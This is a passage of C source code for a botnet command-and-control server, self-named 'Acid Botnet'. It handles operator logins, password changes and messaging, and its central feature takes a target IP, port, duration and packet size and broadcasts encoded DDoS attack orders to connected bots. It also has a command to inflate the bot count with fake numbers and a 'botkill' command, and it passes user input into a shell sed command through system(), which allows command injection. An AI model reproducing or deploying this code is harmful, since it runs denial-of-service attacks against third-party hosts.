					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Password\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(newpassword, buf[datafd].buffer);
					if (strcmp(newpassword, password) == 0)
					{
						sendfd(datafd, "\e[3J\e[37mYou Cant Use The Same Password\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					if (!strcmp(managements[datafd].username, newpassword))
					{
						sendfd(datafd, "\e[3J\e[37mYou Cant Use The Same Username And Password\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sendfd(datafd, "\e[37mAre You Sure y\e[38;5;122m/\e[37mn\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mAccount Info Not Changed\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(yn, buf[datafd].buffer);
					if (strcasestr(yn, "Y") || strcasestr(yn, "YES"))
					{
						sprintf(cmd, "sed '/\\<%s\\>/d' -i login/Login.txt", managements[datafd].username);
						system(cmd);
						SendLog(datafd, "login/Login.txt", "%s %s %s %d %d %s\r\n", managements[datafd].username, newpassword, managements[datafd].id, managements[datafd].maxtime, managements[datafd].cooldown, managements[datafd].expiry);
						SendLog(datafd, "logs/Server.log", "%s: Has Changed There Account Password.\r\n", managements[datafd].username);
						sendfd(datafd, "\e[3J\e[37mYour Account Password Was Successfully Changed\e[38;5;122m.\r\n\e[37mNote\e[38;5;122m:\e[37m Your Old Account Password Will Not Work Anymore\e[38;5;122m.\r\n\e[38;5;122m(\e[37mPlease Re Login\e[38;5;122m)\r\n");
						sleep(3);
						goto end;
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mAccount Info Not Changed\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "CLEAR") || !strcasecmp(buf[datafd].buffer, "CLS") || !strcasecmp(buf[datafd].buffer, "WIPE"))
			{
				sendfd(datafd, "\e[2J\e[3J\e[H");
				sendfile(datafd, "config/banners/subbanner.txt");
			}
			else if (!strcasecmp(buf[datafd].buffer, "MSG"))
			{
				int g, shit = 0;
				sendfd(datafd, "\e[3J\e[37mUser To Msg\e[38;5;122m:\e[37m ");
				memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
				fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
				if (strlen(buf[datafd].buffer) > 15 || strlen(buf[datafd].buffer) < 1)
				{
					sendfd(datafd, "\e[3J\e[37mInvalid User\e[38;5;122m!\r\n");
					goto WhileEnd;
				}
				if (!strcmp(buf[datafd].buffer, managements[datafd].username))
				{
					sendfd(datafd, "\e[3J\e[37mYou Cant Message Yourself\e[38;5;122m!\r\n");
					goto WhileEnd;
				}
				for (g = 0; g < MAXFDS; g++)
				{
					if (!strcmp(managements[g].username, buf[datafd].buffer))
					{
						memset(buf[datafd].buffer, 0, sizeof buf[datafd].buffer);
						sendfd(datafd, "\e[37mMsg To Send\e[38;5;122m:\e[37m ");
						memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
						fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
						if (strlen(buf[datafd].buffer) > 128 || strlen(buf[datafd].buffer) < 1)
						{
							sendfd(datafd, "\e[37mInvalid Msg\e[38;5;122m!\r\n");
							goto WhileEnd;
						}
						sendfd(g, "\r\n\e[3J\e[37mMsg From %s\e[38;5;122m:\e[37m %s\r\n", managements[datafd].username, buf[datafd].buffer);
						sendfd(g, "\r\e[3J\e[38;5;122m[\e[37m%s\e[38;5;122m]@\e[38;5;122m[\e[37mAcid\e[38;5;122m]$\e[37m ", managements[g].username);
						shit = 0;
						break;
					}
					else
						shit = 1;
				}
				if (shit)
					sendfd(datafd, "\e[3J\e[37mUser\e[38;5;122m:\e[37m %s Was Not Found\e[38;5;122m!\r\n", buf[datafd].buffer);
				else
					sendfd(datafd, "\e[3J\e[37mMsg Was Sent To\e[38;5;122m:\e[37m %s\r\n", managements[g].username);
			}
			else if (strstr(buf[datafd].buffer, ". ")) 
			{
				if (!ToggleAttacks)
				{
					if (BotsConnected() > 0)
					{
						if (!managements[datafd].CoolDownStatus)
						{
							char _broadcaststr[128], *broadcaststr;
							size_t argc = 0;
							char **arg = NULL;
							arg = str_split(buf[datafd].buffer, " ", &argc);
							if (argc != 6)
							{
								sendfd(datafd, "\e[3J\e[37mYou Typed It Wrong\e[38;5;122m!\r\n");
								if(arg != NULL)
									free(arg);
								goto WhileEnd;
							}
							char method[80], ip[80], ipresponse[80], port[80], seconds[80], psize[80], blacklistbuf[80];
							strcpy(method, arg[1]);
							strcpy(ip, arg[2]);
							if(inet_addr(ip) == 0)
								goto WhileEnd;
							int found = 0;
							FILE *fp = fopen("config/method-names.txt", "r");
							while(fgets(blacklistbuf, sizeof(blacklistbuf), fp)) {
								trim(blacklistbuf);
								
								if(!strcmp(blacklistbuf, method))
									found = 1;
							}
							if(!found) {
								sendfd(datafd, "\e[3J\e[37mUnkown Method\e[38;5;122m!\r\n");
								goto WhileEnd;
							}
							FILE *bl = fopen("config/blacklist.txt", "r");
							while(fgets(blacklistbuf, sizeof(blacklistbuf), bl) != NULL)
							{
								trim(blacklistbuf);
								if(!strcmp(blacklistbuf, ip))
								{
									sendfd(datafd, "\e[3J\e[37mBlacklisted Host\e[38;5;122m!\r\n");
									SendLog(datafd, "logs/Blacklist.log", "User: %s, tried to attack: %s but the host is blacklisted!", managements[datafd].username, ip);
									if(arg != NULL)
										free(arg);
									goto WhileEnd;
								}
							}
							if (strlen(ip) > 15 || strlen(ip) < 7 || strcasestr(ipresponse, "Failed"))
							{
								sendfd(datafd, "\e[3J\e[37mInvalid Ip\e[38;5;122m!\r\n");
								if(arg != NULL)
									free(arg);
								goto WhileEnd;
							}
							strcpy(port, arg[3]);
							if (atoi(port) > 65535 || atoi(port) < 1)
							{
								sendfd(datafd, "\e[3J\e[37mInvalid Port\e[38;5;122m!\r\n");
								if(arg != NULL)
									free(arg);
								goto WhileEnd;
							}
							strcpy(seconds, arg[4]);
							if (atoi(seconds) > managements[datafd].maxtime)
							{
								sendfd(datafd, "\e[3J\e[37mMax Time Exceeded By\e[38;5;122m:\e[37m %d\e[38;5;122m!\r\n", atoi(arg[3]) - managements[datafd].maxtime);
								if(arg != NULL)
									free(arg);
								goto WhileEnd;
							}
							strcpy(psize, arg[5]);
							if (atoi(psize) > 2048 || atoi(psize) < 1)
							{
								sendfd(datafd, "\e[3J\e[37mInvalid Psize\e[38;5;122m!\r\n");
								if(arg != NULL)
									free(arg);
								goto WhileEnd;
							}
							
							sendfd(datafd, "\e[2J\e[3J\e[H\e[37mDDos Attack Sent\e[38;5;122m.\r\n╔═════════════════════╗\r\n║\e[37m Method\e[38;5;122m:             ║\r\n║\e[37m Ip\e[38;5;122m:                 ║\r\n║\e[37m Port\e[38;5;122m:               ║\r\n║\e[37m Time\e[38;5;122m:               ║\r\n║\e[37m Psize\e[38;5;122m:              ║\r\n╚═════════════════════╝\e[37m\e[3;11H%s\e[4;7H%s\e[5;9H%s\e[6;9H%s\e[7;10H%s\r\n\r\n", method, ip, port, seconds, psize);
							UsersAttacks++;
							totalattacks++;
							SendLog(datafd, "logs/Attack.log", "%s: %s %s %s %s %s\r\n", managements[datafd].username, method, ip, port, seconds, psize);
							sprintf(_broadcaststr, "%s %s %s %s %s", method, ip, port, seconds, psize);
							broadcaststr = encode(_broadcaststr);
							broadcast(broadcaststr);
							struct CoolDownArgs argx;
							struct AtkArgs argz;
							pthread_t Cld, Atk;
							argx.sock = datafd, argx.seconds = managements[datafd].cooldown, argz.seconds = atoi(seconds);
							pthread_create(&Cld, NULL, &StartCldown, &argx);
							pthread_create(&Atk, NULL, &StartAttackBroadcast, &argz);
							if(arg != NULL)
								free(arg);
						}
						else
						{
							sendfd(datafd, "\e[3J\e[37mYour Coold Down Is Not Over\e[38;5;122m,\e[37m Time Left\e[38;5;122m:\e[37m %d\e[38;5;122m!\r\n", managements[datafd].cooldown - managements[datafd].CoolDownSecs);
						}
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mNo Devices Are Connected\e[38;5;122m!\r\n");
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mAttacks Are Disabled\e[38;5;122m!\r\n");
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "FAKEBOTS"))
			{
				if (managements[datafd].OwnerStatus)
				{
					char fakeb0ts[80];
					sendfd(datafd, "\e[3J\e[37mWhat To Fake add\e[38;5;122m/\e[37msub\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 5 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(fakeb0ts, buf[datafd].buffer);
					if (strcasestr(fakeb0ts, "ADD"))
						fakebots = rand() % 5000;
					if (strcasestr(fakeb0ts, "SUB"))
						fakebots = 0;
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "CREDITS"))
				sendfd(datafd, "\e[3J\e[37mYall fucking thought this was slovakia nah its made by urmmommy\r\n");
			else if (!strcasecmp(buf[datafd].buffer, "botkill"))
			{
				if (managements[datafd].OwnerStatus)
				{
					char *string = encode(buf[datafd].buffer);
					sendfd(datafd, "\e[3J\e[37mKilled \e[38;5;122m%d\e[37m bots\e[38;5;122m!\r\n", BotsConnected());
					broadcast(string);
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent A Owner\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "User: %s Tried To Run The botkill Command\r\n", managements[datafd].username);
				}
			}
			else if (strlen(buf[datafd].buffer) >= 0 && strcmp(buf[datafd].buffer, "") != 0)
				sendfd(datafd, "\e[3J\e[37mCommand\e[\e[38;5;122m:\e[37m %s Was not found\e[38;5;122m.\r\n", buf[datafd].buffer);
		WhileEnd:
			sendfd(datafd, "\e[3J\e[38;5;122m[\e[37m%s\e[38;5;122m]@\e[38;5;122m[\e[37mAcid\e[38;5;122m]$\e[37m ", managements[datafd].username);
			SendLog(datafd, "logs/Server.log", "%s: %s\r\n", managements[datafd].username, buf[datafd].buffer);
			memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
			usleep(20000);
		}
	}
end:
	if (SuccessfulLogin == 2)
		SendLog(datafd, "logs/LoggedOut.log", "%s: Has Successfully Logged Out.\r\n", managements[datafd].username);
	close(datafd);
	DelFD(datafd);
	return 0;
}
int main(int argc, char *argv[])
{
	arch_head = NULL;
	struct epoll_event event;
	signal(SIGPIPE, SIG_IGN);
	if (argc != 1)
	{
		fprintf(stderr, "Usage: %s\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	printf("\e[37;1mWelcome to Acid Botnet coded by urmommy\e[38;5;122m!\r\n");
	printf("\e[37;1mStarted\e[38;5;122m.\r\n");
	printf("\e[37;1mBotPort\e[38;5;122m:\e[37;1m [\e[38;5;122m%d\e[37;1m]\r\n", bot_port);
	printf("\e[37;1mCncPort\e[38;5;122m:\e[37;1m [\e[38;5;122m%d\e[37;1m]\r\n", CncPort);
	ListenFD = create_and_bind(bot_port);
	if (ListenFD == -1)
		abort();
	if ((fcntl(ListenFD, F_SETFL, O_NONBLOCK | fcntl(ListenFD, F_GETFL, 0))) == -1)
		abort();
	if (listen(ListenFD, SOMAXCONN) == -1)
		abort();
	if ((EpollFD = epoll_create1(0)) == -1)
		abort();
	event.data.fd = ListenFD;
	event.events = EPOLLIN | EPOLLET;
	if (epoll_ctl(EpollFD, EPOLL_CTL_ADD, ListenFD, &event) == -1)
		abort();
	pthread_t epthread, cthread;
	pthread_create(&epthread, NULL, &BotEventLoop, (void *)NULL);
	pthread_create(&cthread, NULL, &BotListener, (void *)CncPort);

	while (1)
	{
		char *encodedPing = encode("PING");
		broadcast(encodedPing);
		sleep(60);
	}
	close(ListenFD);
	return EXIT_SUCCESS;
}
